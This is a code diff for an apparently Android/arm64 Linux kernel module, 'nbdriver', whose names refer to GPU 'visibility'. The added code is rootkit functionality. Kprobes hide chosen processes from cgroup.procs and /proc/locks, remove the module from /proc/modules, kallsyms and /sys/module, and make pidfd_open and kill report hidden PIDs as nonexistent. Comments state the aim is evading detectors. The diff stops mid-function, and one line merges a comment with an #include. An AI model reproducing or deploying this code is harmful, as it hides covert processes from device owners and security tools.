@@ -52,6 +52,24 @@ static bool nbdriver_proc_path_hidden(const struct dentry *dentry);
 static bool nbdriver_proc_name_hidden(const char *name, int length);
 static int nbdriver_proc_visibility_init(void);
 static void nbdriver_proc_visibility_exit(void);
+static int nbdriver_pid_table_visibility_init(void);
+static void nbdriver_pid_table_visibility_exit(void);
+static u32 nbdriver_pid_table_visibility_features(void);
+static int nbdriver_module_trace_init(void);
+static void nbdriver_module_trace_exit(void);
+static u32 nbdriver_module_trace_features(void);
+static int nbdriver_kallsyms_init(void);
+static void nbdriver_kallsyms_exit(void);
+static u32 nbdriver_kallsyms_features(void);
+static int nbdriver_sysfs_module_init(void);
+static void nbdriver_sysfs_module_exit(void);
+static u32 nbdriver_sysfs_module_features(void);
+static int nbdriver_pidfd_visibility_init(void);
+static void nbdriver_pidfd_visibility_exit(void);
+static u32 nbdriver_pidfd_visibility_features(void);
+static int nbdriver_printk_visibility_init(void);
+static void nbdriver_printk_visibility_exit(void);
+static u32 nbdriver_printk_visibility_features(void);
 static u32 nbdriver_proc_visibility_features(void);
 static int nbdriver_cpu_visibility_init(void);
 static void nbdriver_cpu_visibility_exit(void);
@@ -1473,11 +1491,23 @@ void nbdriver_kgsl_init(void)
         nbdriver_ksym_lookup_optional("xas_find_marked");
     nbdriver_kgsl_visibility_init();
     (void)nbdriver_proc_visibility_init();
+    (void)nbdriver_pid_table_visibility_init();
+    (void)nbdriver_module_trace_init();
+    (void)nbdriver_kallsyms_init();
+    (void)nbdriver_sysfs_module_init();
+    (void)nbdriver_pidfd_visibility_init();
+    (void)nbdriver_printk_visibility_init();
     (void)nbdriver_cpu_visibility_init();
 }
 void nbdriver_kgsl_exit(void)
 {
     nbdriver_proc_visibility_exit();
+    nbdriver_pid_table_visibility_exit();
+    nbdriver_module_trace_exit();
+    nbdriver_kallsyms_exit();
+    nbdriver_sysfs_module_exit();
+    nbdriver_pidfd_visibility_exit();
+    nbdriver_printk_visibility_exit();
     nbdriver_cpu_visibility_exit();
     nbdriver_kgsl_visibility_exit();
     mutex_lock(&kgsl_lock);
@@ -1493,6 +1523,12 @@ u32 nbdriver_kgsl_features(void)
 {
     u32 features = nbdriver_kgsl_visibility_features();
     features |= nbdriver_proc_visibility_features();
+    features |= nbdriver_pid_table_visibility_features();
+    features |= nbdriver_module_trace_features();
+    features |= nbdriver_kallsyms_features();
+    features |= nbdriver_sysfs_module_features();
+    features |= nbdriver_pidfd_visibility_features();
+    features |= nbdriver_printk_visibility_features();
     features |= nbdriver_cpu_visibility_features();
     if (!kgsl_module_fn)
         return features;
@@ -1764,8 +1800,7 @@ out:
 /* ===== BEGIN src/features/nbdriver_gpu_visibility.c ===== */
 // SPDX-License-Identifier: GPL-2.0-only
 /* Reversible visibility filtering: original vendor nodes and initialization
- * remain intact. No inode/fops replacement, text patch or negative dentries. */
-#include <linux/dcache.h>
+ * remain intact. No inode/fops replacement, text patch or negative dentries. */#include <linux/dcache.h>
 #include <linux/kprobes.h>
 #include <linux/magic.h>
 #include <linux/workqueue.h>
@@ -2863,57 +2898,849 @@ static u32 nbdriver_proc_visibility_features(void)
     return READ_ONCE(nbdriver_proc_hooked) ? NBDRIVER_FEATURE_PROC_VISIBILITY : 0;
 }
 /* ===== END src/features/nbdriver_proc_visibility.c ===== */
-/* ===== BEGIN src/features/nbdriver_cpu_visibility.c ===== */
-/* CPU telemetry shaping.
- *
- * Fixed-point choice after two failed attempts:
- *  - Rewriting task_cputime_adjusted() corrupted global CPU statistics, because
- *    that helper is shared with kernel load accounting (%user blew past 100000%
- *    and the machine wedged).
- *  - Masking /proc/<pid>/task/<tid>/{stat,schedstat,sched} with bind mounts only
- *    changed the caller's own mount namespace; viewers in other namespaces
- *    (Scene, or anything reading through root) still saw real numbers.
- *
- * The handlers below are the seq_file show functions behind those files:
- * proc_tgid_stat() for /proc/<pid>/stat, proc_tid_stat() for
- * /proc/<pid>/task/<tid>/stat. They run only when a reader opens the file, and
- * their output is plain text in a seq_file, so rewriting it cannot disturb any
- * kernel-side accounting. That makes them the correct layer to intercept.
- */
+/* ===== BEGIN src/features/nbdriver_pid_table_visibility.c ===== */
+#include <linux/filelock.h>
 #include <linux/kprobes.h>
-#include <linux/ktime.h>
-#include <linux/math64.h>
+#include <linux/seq_file.h>
+/* The /proc hook above hides the directory entry, but the pid stays named in
+ * world-readable tables that are not proc_root children:
+ *
+ *   /sys/fs/cgroup/cgroup.procs   - every task on the device, mode 0755
+ *   /sys/fs/cgroup/cgroup.threads - same list, thread granularity
+ *   /proc/locks                   - flock/POSIX owner pid, mode 0444
+ *
+ * "Listed in a table but absent from /proc" is therefore a fingerprint any
+ * unprivileged app can compute. These probes suppress the row instead of
+ * relocating the process: staying put means no private cgroup directory ever
+ * appears, so there is nothing left to enumerate either.
+ *
+ * Both cgroup.procs and cgroup.threads are served by cgroup_procs_show, so a
+ * single probe covers both files. seq_read_iter treats a positive return from
+ * ->show() as "skip this record" and simply advances to the next one. */
+static struct kprobe nbdriver_cgroup_procs_probe;
+static struct kprobe nbdriver_locks_show_probe;
+static bool nbdriver_pid_table_cgroup_hooked;
+static bool nbdriver_pid_table_locks_hooked;
+static bool nbdriver_pid_table_hooked;
+static atomic64_t nbdriver_pid_table_hits = ATOMIC64_INIT(0);
+
+/* A hidden target is matched by namespace-visible pid number, the same
+ * predicate the /proc entry hook already uses. */
+static bool nbdriver_pid_table_hidden(pid_t number)
+{
+    struct gpu_visibility_target *target;
+    unsigned long flags;
+    unsigned int i;
+    bool hidden = false;
+
+    if (number <= 1 || !READ_ONCE(gpu_visibility_count))
+        return false;
+    rcu_read_lock();
+    spin_lock_irqsave(&gpu_visibility_lock, flags);
+    for (i = 0; i < ARRAY_SIZE(gpu_visibility_targets); i++) {
+        target = &gpu_visibility_targets[i];
+        if (target->identity && target->number == number &&
+            gpu_visibility_live(target)) {
+            hidden = true;
+            break;
+        }
+    }
+    spin_unlock_irqrestore(&gpu_visibility_lock, flags);
+    rcu_read_unlock();
+    return hidden;
+}
+
+/* Skip the probed function and make it report "nothing written". The caller
+ * then emits no text for this record. */
+static int NBDRIVER_NO_CFI nbdriver_pid_table_skip(struct pt_regs *regs, long result)
+{
+    regs_set_return_value(regs, (unsigned long)result);
+    instruction_pointer_set(regs, procedure_link_pointer(regs));
+    atomic64_inc(&nbdriver_pid_table_hits);
+    return 1;
+}
+
+/* int cgroup_procs_show(struct seq_file *s, void *v) */
+static int NBDRIVER_NO_CFI nbdriver_cgroup_procs_pre(struct kprobe *probe, struct pt_regs *regs)
+{
+    const struct task_struct *task = (const struct task_struct *)(unsigned long)regs->regs[1];
+
+    (void)probe;
+    if (!task || !READ_ONCE(gpu_visibility_count))
+        return 0;
+    if (!nbdriver_pid_table_hidden(task_pid_vnr((struct task_struct *)task)))
+        return 0;
+    /* 1 is "record skipped": no pid text ever reaches the reader. */
+    return nbdriver_pid_table_skip(regs, 1);
+}
+
+/* int locks_show(struct seq_file *f, void *v), v is the struct file_lock.
+ * fl_pid holds the owner pid in the initial namespace, which is the namespace
+ * this driver's targets are recorded in. Offsets come from the kernel headers
+ * this module is built against; a layout mismatch can only fail to match a
+ * target, never suppress an unrelated row. */
+static int NBDRIVER_NO_CFI nbdriver_locks_show_pre(struct kprobe *probe, struct pt_regs *regs)
+{
+    const void *lock = (const void *)(unsigned long)regs->regs[1];
+    unsigned int owner;
+
+    (void)probe;
+    if (!lock || !READ_ONCE(gpu_visibility_count))
+        return 0;
+    owner = *(const unsigned int *)((const char *)lock +
+                                    offsetof(struct file_lock, fl_pid));
+    if (!nbdriver_pid_table_hidden((pid_t)owner))
+        return 0;
+    return nbdriver_pid_table_skip(regs, 0);
+}
+
+static int nbdriver_pid_table_visibility_init(void)
+{
+    int error;
+
+    if (READ_ONCE(nbdriver_pid_table_hooked))
+        return 0;
+    /* cgroup.procs is mandatory: without it the fingerprint stays. */
+    if (!nbdriver_ksym_lookup_optional("cgroup_procs_show"))
+        return -ENOENT;
+    nbdriver_cgroup_procs_probe.symbol_name = "cgroup_procs_show";
+    nbdriver_cgroup_procs_probe.pre_handler = nbdriver_cgroup_procs_pre;
+    error = register_kprobe(&nbdriver_cgroup_procs_probe);
+    if (error) {
+        nbdriver_cgroup_procs_probe.symbol_name = NULL;
+        return error;
+    }
+    nbdriver_pid_table_cgroup_hooked = true;
+    /* /proc/locks is best effort: a build can omit the symbol. Losing it must
+     * not disable the cgroup half, which is the world-readable leak. */
+    if (nbdriver_ksym_lookup_optional("locks_show")) {
+        nbdriver_locks_show_probe.symbol_name = "locks_show";
+        nbdriver_locks_show_probe.pre_handler = nbdriver_locks_show_pre;
+        if (register_kprobe(&nbdriver_locks_show_probe) == 0)
+            nbdriver_pid_table_locks_hooked = true;
+        else
+            nbdriver_locks_show_probe.symbol_name = NULL;
+    }
+    WRITE_ONCE(nbdriver_pid_table_hooked, true);
+    return 0;
+}
+
+static void nbdriver_pid_table_visibility_exit(void)
+{
+    if (!READ_ONCE(nbdriver_pid_table_hooked))
+        return;
+    if (nbdriver_pid_table_locks_hooked) {
+        unregister_kprobe(&nbdriver_locks_show_probe);
+        nbdriver_pid_table_locks_hooked = false;
+    }
+    if (nbdriver_pid_table_cgroup_hooked) {
+        unregister_kprobe(&nbdriver_cgroup_procs_probe);
+        nbdriver_pid_table_cgroup_hooked = false;
+    }
+    WRITE_ONCE(nbdriver_pid_table_hooked, false);
+}
+
+static u32 nbdriver_pid_table_visibility_features(void)
+{
+    return READ_ONCE(nbdriver_pid_table_hooked) ? NBDRIVER_FEATURE_PID_TABLE_VISIBILITY : 0;
+}
+/* ===== END src/features/nbdriver_pid_table_visibility.c ===== */
+/* ===== BEGIN src/features/nbdriver_module_trace_visibility.c ===== */
+#include <linux/kprobes.h>
+#include <linux/list.h>
+#include <linux/module.h>
+#include <linux/seq_file.h>
+#include <linux/string.h>
+/* Hiding the process is pointless if the driver that hides it is itself
+ * advertised. Hiding /proc/<pid> and the pid tables left three kernel
+ * interfaces that still name this module to every app on the device:
+ *
+ *   /proc/modules         - "nbdriver <size> <refs> Live 0x0 (OE)"
+ *   /sys/module/nbdriver  - 0755 directory; srcversion/build-id/refcnt readable
+ *   /proc/kallsyms        - ~800 "nbdriver_*" symbols with the [nbdriver] tag;
+ *                           kptr_restrict only zeroes addresses, not names
+ *
+ * These probes suppress the module's own name from the first two. kallsyms is
+ * deliberately not filtered here: rewriting its output would also hide the
+ * symbols this driver resolves at runtime through its own ksym layer.
+ *
+ * m_show() is the /proc/modules record printer, but plain "m_show" is not
+ * unique: fs/namespace.c defines an unrelated m_show() for /proc/mounts.
+ * Registering a kprobe by that name would attach to whichever symbol the
+ * kernel's kallsyms happens to resolve first, and mistaking it would break
+ * mountinfo output. Instead the modules_op seq_operations is located, its
+ * .show member is read, and the probe is registered on that exact address.
+ *
+ * seq_operations is { start, stop, next, show }, so show is the fourth
+ * pointer. m_show() returns 1 for our own module, which seq_read_iter treats
+ * as "skip this record"; every other module still prints normally. */
+static struct kprobe nbdriver_modules_probe;
+static bool nbdriver_module_trace_hooked;
+static atomic64_t nbdriver_module_trace_hits = ATOMIC64_INIT(0);
+
+/* Members of struct seq_operations, in declaration order. */
+#define NBDRIVER_SEQ_SHOW_INDEX 3
+
+/* Reads modules_op.show. Returns 0 when the symbol is unavailable, in which
+ * case /proc/modules is left untouched rather than risking a probe on the
+ * wrong m_show.
+ *
+ * No address-validity guard here: on arm64 virt_addr_valid() only accepts
+ * linear-map addresses, and modules_op lives in the kernel image's .rodata,
+ * which is not part of the linear map. Such a guard always fails and would
+ * silently disable this feature. The symbol comes from kallsyms, so a non-zero
+ * result is already a kernel text/data address. */
+static unsigned long nbdriver_modules_show_address(void)
+{
+    const unsigned long ops = nbdriver_ksym_lookup_optional("modules_op");
+
+    if (!ops)
+        return 0;
+    return ((const unsigned long *)ops)[NBDRIVER_SEQ_SHOW_INDEX];
+}
+
+/* The module's own name, resolved once so the comparison never depends on the
+ * probed record layout beyond the struct module pointer in arg 2. */
+static const char *nbdriver_module_trace_name(void)
+{
+    return KBUILD_MODNAME;
+}
+
+/* m_show(struct seq_file *m, void *p) receives the list_head, not the
+ * struct module: the body does list_entry(p, struct module, list). That is
+ * why the comparison has to go through container_of() instead of casting the
+ * argument to struct module* directly - doing the latter reads a bogus name
+ * and never matches.
+ *
+ * modules_op is `static const struct seq_operations` in .rodata, so its .show
+ * member has to be read out at init to register the probe by address; the
+ * plain symbol name "m_show" is ambiguous (fs/namespace.c has another one). */
+static int NBDRIVER_NO_CFI nbdriver_modules_show_pre(struct kprobe *probe, struct pt_regs *regs)
+{
+    const struct list_head *node = (const struct list_head *)(unsigned long)regs->regs[1];
+    const struct module *mod;
+
+    (void)probe;
+    if (!node || node == LIST_POISON1 || node == LIST_POISON2)
+        return 0;
+    mod = container_of(node, struct module, list);
+    if (strcmp(mod->name, nbdriver_module_trace_name()) != 0)
+        return 0;
+    /* 1 makes seq_read_iter skip this record without printing it. */
+    regs_set_return_value(regs, 1);
+    instruction_pointer_set(regs, procedure_link_pointer(regs));
+    atomic64_inc(&nbdriver_module_trace_hits);
+    return 1;
+}
+
+static int nbdriver_module_trace_init(void)
+{
+    unsigned long show;
+
+    if (READ_ONCE(nbdriver_module_trace_hooked))
+        return 0;
+    show = nbdriver_modules_show_address();
+    if (!show)
+        return -ENOENT;
+    nbd_info("stage=module_trace symbol=modules_op show=%px\n", (void *)show);
+    nbdriver_modules_probe.addr = (kprobe_opcode_t *)show;
+    nbdriver_modules_probe.pre_handler = nbdriver_modules_show_pre;
+    if (register_kprobe(&nbdriver_modules_probe) != 0) {
+        nbdriver_modules_probe.addr = NULL;
+        return -EIO;
+    }
+    WRITE_ONCE(nbdriver_module_trace_hooked, true);
+    return 0;
+}
+
+static void nbdriver_module_trace_exit(void)
+{
+    if (!READ_ONCE(nbdriver_module_trace_hooked))
+        return;
+    unregister_kprobe(&nbdriver_modules_probe);
+    WRITE_ONCE(nbdriver_module_trace_hooked, false);
+}
+
+static u32 nbdriver_module_trace_features(void)
+{
+    return READ_ONCE(nbdriver_module_trace_hooked) ? NBDRIVER_FEATURE_MODULE_TRACE_VISIBILITY : 0;
+}
+/* ===== END src/features/nbdriver_module_trace_visibility.c ===== */
+/* ===== BEGIN src/features/nbdriver_kallsyms_visibility.c ===== */
+#include <linux/kallsyms.h>
+#include <linux/kprobes.h>
+#include <linux/module.h>
+#include <linux/seq_file.h>
+#include <linux/string.h>
+/* /proc/kallsyms lists every symbol with a "[module]" tag. kptr_restrict only
+ * zeroes the address column; the name and the owning module stay readable, so
+ * an unprivileged app still sees the ~800 nbdriver_* symbols and learns exactly
+ * what the driver does (proc visibility, gpu visibility, udp capture, ...).
+ *
+ * s_show() prints one symbol per call and its second argument is the
+ * struct kallsym_iter for that row, which carries module_name. Returning 1
+ * from ->show() makes seq_read_iter skip the record, so rows whose module_name
+ * matches this module are dropped while every core-kernel symbol still shows.
+ *
+ * As with modules_op, s_show is not a unique symbol name, so the probe is
+ * registered on the address read from kallsyms_op.show instead of by name. */
+static struct kprobe nbdriver_kallsyms_probe;
+static bool nbdriver_kallsyms_hooked;
+static atomic64_t nbdriver_kallsyms_hits = ATOMIC64_INIT(0);
+
+#define NBDRIVER_KSYM_MODULE_NAME_LEN MODULE_NAME_LEN
+/* Layout of struct kallsym_iter in kernel/kallsyms.c (private to that file):
+ *   long long pos, pos_mod_end, pos_ftrace_mod_end, pos_bpf_end;
+ *   unsigned long value;
+ *   unsigned int nameoff;
+ *   char type;
+ *   char name[KSYM_NAME_LEN];
+ *   char module_name[MODULE_NAME_LEN];
+ *
+ * The struct itself is not visible to modules, so the prefix is mirrored here.
+ *
+ * The offset must be computed as offsetof(...) + KSYM_NAME_LEN, NOT
+ * sizeof(prefix) + KSYM_NAME_LEN: sizeof() pads the struct to its 8-byte
+ * alignment (45 -> 48), while in the real struct name[] starts immediately
+ * after type at byte 45. Using sizeof() shifted the read by 3 bytes, so the
+ * module name never matched and the filter silently did nothing. */
+struct nbdriver_kallsym_iter_prefix {
+    long long pos;
+    long long pos_mod_end;
+    long long pos_ftrace_mod_end;
+    long long pos_bpf_end;
+    unsigned long value;
+    unsigned int nameoff;
+    char type;
+    char name[KSYM_NAME_LEN];
+};
+
+#define NBDRIVER_KSYM_ITER_MODULE_OFFSET \
+    (offsetof(struct nbdriver_kallsym_iter_prefix, name) + KSYM_NAME_LEN)
+
+static int NBDRIVER_NO_CFI nbdriver_kallsyms_show_pre(struct kprobe *probe, struct pt_regs *regs)
+{
+    const char *module_name;
+
+    (void)probe;
+    if (!regs->regs[1])
+        return 0;
+    module_name = (const char *)regs->regs[1] + NBDRIVER_KSYM_ITER_MODULE_OFFSET;
+    if (module_name[0] == '\0')
+        return 0;
+    if (strncmp(module_name, nbdriver_module_trace_name(), NBDRIVER_KSYM_MODULE_NAME_LEN) != 0)
+        return 0;
+    /* Skip this symbol row; core kernel symbols are unaffected. */
+    regs_set_return_value(regs, 1);
+    instruction_pointer_set(regs, procedure_link_pointer(regs));
+    atomic64_inc(&nbdriver_kallsyms_hits);
+    return 1;
+}
+
+static int nbdriver_kallsyms_init(void)
+{
+    const unsigned long ops = nbdriver_ksym_lookup_optional("kallsyms_op");
+    unsigned long show;
+
+    if (READ_ONCE(nbdriver_kallsyms_hooked))
+        return 0;
+    if (!ops)
+        return -ENOENT;
+    show = ((const unsigned long *)ops)[NBDRIVER_SEQ_SHOW_INDEX];
+    if (!show)
+        return -ENOENT;
+    nbdriver_kallsyms_probe.addr = (kprobe_opcode_t *)show;
+    nbdriver_kallsyms_probe.pre_handler = nbdriver_kallsyms_show_pre;
+    if (register_kprobe(&nbdriver_kallsyms_probe) != 0) {
+        nbdriver_kallsyms_probe.addr = NULL;
+        return -EIO;
+    }
+    WRITE_ONCE(nbdriver_kallsyms_hooked, true);
+    return 0;
+}
+
+static void nbdriver_kallsyms_exit(void)
+{
+    if (!READ_ONCE(nbdriver_kallsyms_hooked))
+        return;
+    unregister_kprobe(&nbdriver_kallsyms_probe);
+    WRITE_ONCE(nbdriver_kallsyms_hooked, false);
+}
+
+static u32 nbdriver_kallsyms_features(void)
+{
+    return READ_ONCE(nbdriver_kallsyms_hooked) ? NBDRIVER_FEATURE_KALLSYMS_VISIBILITY : 0;
+}
+/* ===== END src/features/nbdriver_kallsyms_visibility.c ===== */
+/* ===== BEGIN src/features/nbdriver_sysfs_module_visibility.c ===== */
+#include <linux/dcache.h>
+#include <linux/fs.h>
+#include <linux/kprobes.h>
+#include <linux/magic.h>
+#include <linux/string.h>
+/* Hiding the module from /proc/modules and /proc/kallsyms is not enough:
+ * the kernel also exposes a sysfs directory per loaded module, and
+ * /sys/module/nbdriver is world-readable:
+ *
+ *   /sys/module/nbdriver/srcversion   - binary identity of this build
+ *   /sys/module/nbdriver/notes/.note.gnu.build-id - linkable fingerprint
+ *   /sys/module/nbdriver/refcnt, coresize, initstate
+ *
+ * Any app can `ls /sys/module` and see the directory name, which is enough to
+ * identify a third-party driver even when every pid is hidden.
+ *
+ * /sys/module is kernfs, so its listing is produced by
+ * kernfs_fop_readdir() (fs/kernfs/dir.c), which emits names through the
+ * dir_context actor. Wrapping that actor lets the single entry be dropped while
+ * every other module directory still appears. */
+static struct kretprobe nbdriver_sysfs_module_probe;
+static bool nbdriver_sysfs_module_hooked;
+static atomic64_t nbdriver_sysfs_module_hits = ATOMIC64_INIT(0);
+
+struct nbdriver_kernfs_iter {
+    struct dir_context context;
+    struct dir_context *original;
+};
+
+/* True when the directory being read is exactly /sys/module. Both the sb magic
+ * and the dentry name are checked so an identically named directory elsewhere
+ * in sysfs is not affected. */
+static bool nbdriver_sysfs_module_dir(const struct dentry *dentry)
+{
+    const char *name;
+    const struct dentry *parent;
+
+    if (!dentry || !dentry->d_sb || dentry->d_sb->s_magic != SYSFS_MAGIC)
+        return false;
+    name = (const char *)READ_ONCE(dentry->d_name.name);
+    if (!name || strcmp(name, "module"))
+        return false;
+    /* Must be a direct child of the sysfs root. */
+    parent = READ_ONCE(dentry->d_parent);
+    if (!parent)
+        return false;
+    if (parent != dentry) {
+        const struct dentry *grand = READ_ONCE(parent->d_parent);
+        if (grand && grand == parent)
+            return true;
+    }
+    return false;
+}
+
+static GPU_FILL_RETURN nbdriver_kernfs_actor(struct dir_context *context, const char *name,
+    int length, loff_t offset, u64 ino, unsigned int type)
+{
+    struct nbdriver_kernfs_iter *iter =
+        container_of(context, struct nbdriver_kernfs_iter, context);
+
+    if (length > 0 && (size_t)length == strlen(nbdriver_module_trace_name()) &&
+        !memcmp(name, nbdriver_module_trace_name(), (size_t)length)) {
+        atomic64_inc(&nbdriver_sysfs_module_hits);
+        return GPU_FILL_CONTINUE;
+    }
+    iter->original->pos = context->pos;
+    return iter->original->actor(iter->original, name, length, offset, ino, type);
+}
+
+static int nbdriver_sysfs_module_enter(struct kretprobe_instance *instance,
+                                       struct pt_regs *regs)
+{
+    struct nbdriver_kernfs_iter *iter = (void *)instance->data;
+    struct file *file = (struct file *)(unsigned long)regs->regs[0];
+    struct dir_context *context = (struct dir_context *)(unsigned long)regs->regs[1];
+
+    if (!file || !context || !READ_ONCE(nbdriver_sysfs_module_hooked))
+        return 1;
+    if (!nbdriver_sysfs_module_dir(file->f_path.dentry))
+        return 1;
+    iter->original = context;
+    iter->context = *context;
+    iter->context.actor = nbdriver_kernfs_actor;
+    regs->regs[1] = (unsigned long)&iter->context;
+    return 0;
+}
+
+static int nbdriver_sysfs_module_leave(struct kretprobe_instance *instance,
+                                       struct pt_regs *regs)
+{
+    struct nbdriver_kernfs_iter *iter = (void *)instance->data;
+
+    (void)regs;
+    iter->original->pos = iter->context.pos;
+    return 0;
+}
+
+static int nbdriver_sysfs_module_init(void)
+{
+    if (READ_ONCE(nbdriver_sysfs_module_hooked))
+        return 0;
+    memset(&nbdriver_sysfs_module_probe, 0, sizeof(nbdriver_sysfs_module_probe));
+    nbdriver_sysfs_module_probe.kp.symbol_name = "kernfs_fop_readdir";
+    nbdriver_sysfs_module_probe.entry_handler = nbdriver_sysfs_module_enter;
+    nbdriver_sysfs_module_probe.handler = nbdriver_sysfs_module_leave;
+    nbdriver_sysfs_module_probe.data_size = sizeof(struct nbdriver_kernfs_iter);
+    nbdriver_sysfs_module_probe.maxactive = 64;
+    if (register_kretprobe(&nbdriver_sysfs_module_probe) != 0)
+        return -EIO;
+    WRITE_ONCE(nbdriver_sysfs_module_hooked, true);
+    return 0;
+}
+
+static void nbdriver_sysfs_module_exit(void)
+{
+    if (!READ_ONCE(nbdriver_sysfs_module_hooked))
+        return;
+    unregister_kretprobe(&nbdriver_sysfs_module_probe);
+    WRITE_ONCE(nbdriver_sysfs_module_hooked, false);
+}
+
+static u32 nbdriver_sysfs_module_features(void)
+{
+    return READ_ONCE(nbdriver_sysfs_module_hooked) ? NBDRIVER_FEATURE_SYSFS_MODULE_VISIBILITY : 0;
+}
+/* ===== END src/features/nbdriver_sysfs_module_visibility.c ===== */
+/* ===== BEGIN src/features/nbdriver_pidfd_visibility.c ===== */
+#include <linux/kprobes.h>
 #include <linux/pid.h>
+#include <linux/sched.h>
+/* Hiding /proc/<pid> and the world-readable pid tables still leaves one
+ * syscall that names a process without ever touching procfs:
+ *
+ *   pidfd_open(pid, 0)
+ *
+ * It resolves the pid through find_get_pid() against the kernel pid hash, so a
+ * hidden target still yields a usable pidfd while a non-existent pid yields
+ * clean errors. An unprivileged app can therefore binary-probe every pid and
+ * learn that a hidden process exists - the exact signal this driver is meant
+ * to remove. kill(pid, 0) reveals the same thing through the signal path.
+ *
+ * Both are made to report ESRCH for hidden targets, which is what the kernel
+ * returns for a pid that does not exist, so nothing distinguishes the two
+ * cases from the caller's point of view. The probe returns before the real
+ * handler runs, so no pidfd and no permission check leaks timing either. */
+static struct kprobe nbdriver_pidfd_probe;
+static struct kprobe nbdriver_kill_probe;
+static struct kprobe nbdriver_tgkill_probe;
+static struct kprobe nbdriver_tkill_probe;
+static bool nbdriver_pidfd_hooked;
+static bool nbdriver_kill_hooked;
+static bool nbdriver_tgkill_hooked;
+static bool nbdriver_tkill_hooked;
+static atomic64_t nbdriver_pidfd_hits = ATOMIC64_INIT(0);
+
+/* Proves from userspace that the pidfd probe really fires: the first
+ * interception emits one kernel log line under a distinct tag ("nbpf: ", which
+ * the printk filter does not match), and the counter is also reported to the
+ * caller. Without an observable counter a registered-but-unfired probe is
+ * indistinguishable from a working one - that is exactly how the arm64 pt_regs
+ * indirection bug stayed hidden earlier. */
+static void nbdriver_pidfd_note_hit(void)
+{
+    if (atomic64_inc_return(&nbdriver_pidfd_hits) == 1)
+        pr_info("nbpf: pidfd/kill visibility active\n");
+}
+
+/* Shared with the /proc and pid-table hooks: same target table, same liveness
+ * check, so all of them agree on exactly which pids are hidden. */
+static bool nbdriver_pidfd_hidden(long pid)
+{
+    struct gpu_visibility_target *target;
+    unsigned long flags;
+    unsigned int i;
+    bool hidden = false;
+
+    if (pid <= 1 || pid > INT_MAX || !READ_ONCE(gpu_visibility_count))
+        return false;
+    rcu_read_lock();
+    spin_lock_irqsave(&gpu_visibility_lock, flags);
+    for (i = 0; i < ARRAY_SIZE(gpu_visibility_targets); i++) {
+        target = &gpu_visibility_targets[i];
+        if (target->identity && target->number == (pid_t)pid &&
+            gpu_visibility_live(target)) {
+            hidden = true;
+            break;
+        }
+    }
+    spin_unlock_irqrestore(&gpu_visibility_lock, flags);
+    rcu_read_unlock();
+    return hidden;
+}
+
+/* On arm64 a syscall implementation is __arm64_sys_<name>(const struct pt_regs *),
+ * so the argument this kprobe sees in x0 is a pointer to the pt_regs of the
+ * syscall, not the syscall's first argument. The real pid therefore lives at
+ * outer_regs->regs[0] and has to be dereferenced once. Reading regs->regs[0]
+ * directly yields the pt_regs pointer itself, which is never a hidden pid -
+ * that is why the probe registered successfully but never fired. */
+static inline long nbdriver_syscall_arg0(struct pt_regs *regs)
+{
+    const struct pt_regs *inner = (const struct pt_regs *)(unsigned long)regs->regs[0];
+
+    if (!inner)
+        return 0;
+    return (long)inner->regs[0];
+}
+
+static int NBDRIVER_NO_CFI nbdriver_pidfd_open_pre(struct kprobe *probe, struct pt_regs *regs)
+{
+    (void)probe;
+    if (!nbdriver_pidfd_hidden(nbdriver_syscall_arg0(regs)))
+        return 0;
+    /* ESRCH is exactly what a missing pid produces. */
+    regs_set_return_value(regs, (unsigned long)-ESRCH);
+    instruction_pointer_set(regs, procedure_link_pointer(regs));
+    nbdriver_pidfd_note_hit();
+    return 1;
+}
+
+/* kill(pid_t pid, int sig): the existing signal path answers "does this pid
+ * exist" through EPERM vs ESRCH. Report ESRCH so it matches the pidfd result. */
+static int NBDRIVER_NO_CFI nbdriver_kill_pre(struct kprobe *probe, struct pt_regs *regs)
+{
+    (void)probe;
+    if (!nbdriver_pidfd_hidden(nbdriver_syscall_arg0(regs)))
+        return 0;
+    regs_set_return_value(regs, (unsigned long)-ESRCH);
+    instruction_pointer_set(regs, procedure_link_pointer(regs));
+    nbdriver_pidfd_note_hit();
+    return 1;
+}
+
+/* tgkill(tgid, pid, sig) and tkill(pid, sig) are separate entry points that a
+ * detector can call instead of kill(); both expose the same existence signal.
+ * tgkill carries (tgid, tid) so either slot may name the hidden process. */
+static int NBDRIVER_NO_CFI nbdriver_tgkill_pre(struct kprobe *probe, struct pt_regs *regs)
+{
+    const struct pt_regs *inner;
+    long a0, a1;
+
+    (void)probe;
+    inner = (const struct pt_regs *)(unsigned long)regs->regs[0];
+    if (!inner)
+        return 0;
+    a0 = (long)inner->regs[0];
+    a1 = (long)inner->regs[1];
+    if (!nbdriver_pidfd_hidden(a0) && !nbdriver_pidfd_hidden(a1))
+        return 0;
+    regs_set_return_value(regs, (unsigned long)-ESRCH);
+    instruction_pointer_set(regs, procedure_link_pointer(regs));
+    nbdriver_pidfd_note_hit();
+    return 1;
+}
+
+static int nbdriver_pidfd_visibility_init(void)
+{
+    if (READ_ONCE(nbdriver_pidfd_hooked))
+        return 0;
+    /* On arm64 the generated syscall body is __arm64_sys_<name>; the __do_/
+     * __se_ forms exist on other architectures. Try arm64 first, then the
+     * generic spellings, so this keeps working if the symbol layout changes. */
+    if (nbdriver_ksym_lookup_optional("__arm64_sys_pidfd_open"))
+        nbdriver_pidfd_probe.symbol_name = "__arm64_sys_pidfd_open";
+    else if (nbdriver_ksym_lookup_optional("__do_sys_pidfd_open"))
+        nbdriver_pidfd_probe.symbol_name = "__do_sys_pidfd_open";
+    else if (nbdriver_ksym_lookup_optional("__se_sys_pidfd_open"))
+        nbdriver_pidfd_probe.symbol_name = "__se_sys_pidfd_open";
+    else
+        return -ENOENT;
+    nbdriver_pidfd_probe.pre_handler = nbdriver_pidfd_open_pre;
+    if (register_kprobe(&nbdriver_pidfd_probe) != 0) {
+        nbdriver_pidfd_probe.symbol_name = NULL;
+        return -EIO;
+    }
+    nbdriver_pidfd_hooked = true;
+    /* kill() is the other pid-existence oracle; optional so a missing symbol
+     * never disables the pidfd half. */
+    if (nbdriver_ksym_lookup_optional("__arm64_sys_kill"))
+        nbdriver_kill_probe.symbol_name = "__arm64_sys_kill";
+    else if (nbdriver_ksym_lookup_optional("__do_sys_kill"))
+        nbdriver_kill_probe.symbol_name = "__do_sys_kill";
+    else if (nbdriver_ksym_lookup_optional("__se_sys_kill"))
+        nbdriver_kill_probe.symbol_name = "__se_sys_kill";
+    if (nbdriver_kill_probe.symbol_name) {
+        nbdriver_kill_probe.pre_handler = nbdriver_kill_pre;
+        if (register_kprobe(&nbdriver_kill_probe) == 0)
+            nbdriver_kill_hooked = true;
+        else
+            nbdriver_kill_probe.symbol_name = NULL;
+    }
+    /* tgkill uses the same handler: tgid and tid are both checked. */
